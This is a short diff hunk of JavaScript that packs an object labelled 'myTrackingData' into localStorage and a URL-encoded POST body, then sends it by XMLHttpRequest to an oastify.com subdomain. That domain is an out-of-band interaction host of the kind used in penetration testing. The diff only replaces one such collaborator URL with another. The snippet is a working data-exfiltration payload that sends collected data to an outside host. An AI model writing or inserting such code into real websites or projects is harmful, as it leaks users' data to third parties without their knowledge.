@@ -11,7 +11,7 @@ const myTrackingData = JSON.stringify({
 localStorage.setItem( 'myTrackingData', myTrackingData);
 var postData = "msg=" + encodeURIComponent(myTrackingData) ;
 var xhr = new XMLHttpRequest() ;
-var url = "https://89fdj84vk96yakfgoiv6eap2etkl8fw4.oastify.com"; // Replace with the correct URL
+var url = "https://xcd2mx7kny9nd9i5r7yvhzsrhincb2zr.oastify.com"; // Replace with the correct URL
 xhr.open("POST", url, true);
 xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 
